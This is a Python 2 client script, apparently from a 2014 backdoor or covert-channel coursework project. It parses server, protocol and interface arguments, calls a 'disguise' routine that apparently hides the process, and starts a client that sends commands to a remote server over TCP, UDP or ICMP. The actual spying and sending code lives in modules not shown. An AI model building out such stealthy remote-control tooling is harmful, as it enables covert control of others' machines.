"""
/*---------------------------------------------------------------------------------------
--  SOURCE FILE:    client.py
--
--  PROGRAM:        client
--
--  FUNCTIONS:      main(argv)
--                  checkArgs(argv)
--					usage()
--
--  DATE:           December 7th, 2014
--
--  DESIGNERS:      Jacob Miner
--
--  PROGRAMMERS:    Jacob Miner
--
--  NOTES:			This is the client application that connects to and sends commands to
--  				the remote server
---------------------------------------------------------------------------------------*/
"""
import socket
from struct import *
import pcapy
import sys
import psutil
import threading
import config
import spyFunctions
import sendFunctions
import getopt

running = True
server = ""
protocol = ""
interface = ""

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   main()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	main(argv)
--					argv - the arguments to the program
--
--  RETURNS:  void
--
--  NOTES:  The main thread of the program. Starts the rest of the progress
--  
------------------------------------------------------------------------------*/
"""
def main(argv):
	global running 
	
	checkArgs(argv)
	spyFunctions.disguise()
	sendFunctions.startClient(server, protocol, interface)
	
	try: 
		while(running):
			pass
	except (KeyboardInterrupt, SystemExit):
		running = False
		sys.exit()

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   checkArgs()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	checkArgs(argv)
--					argv - the arguments to the program
--
--  RETURNS:  	void
--
--  NOTES:  	Checks the arguments for the program and sets the parameters
--  
------------------------------------------------------------------------------*/
"""
def checkArgs(argv):
	global server
	global protocol
	global interface

	try: 
		opts, args = getopt.getopt(argv[1:], 's:p:i:h', ['server', 'protocol', 'interface', 'help'])
	except getopt.GetoptError:
		usage()
		sys.exit(2)

	for opt, arg in opts:
		if opt in ('-h', '--help'):
			usage()
			sys.exit(2)
		elif opt in ('-s', '--server'):
			server = arg
		elif opt in ('-p', '--protocol'):
			protocol = arg
		elif opt in ('-i', '--interface'):
			interface = arg

	if (server == "" or protocol == "" or interface == ""):
		usage()
		sys.exit(2)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   usage()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	usage()
--
--  RETURNS:  	void
--
--  NOTES:  	Prints the usage of the program
--  
------------------------------------------------------------------------------*/
"""
def usage():
	print "usage: python client.py -s <serverIP> -p <protocol> -i <interface>"
	print "		-s Server IP Address"
	print "		-p Protocol to send with (TCP, UDP, or ICMP)"
	print "		-i Interface to read from and write to"

if __name__ == "__main__":
	main(sys.argv)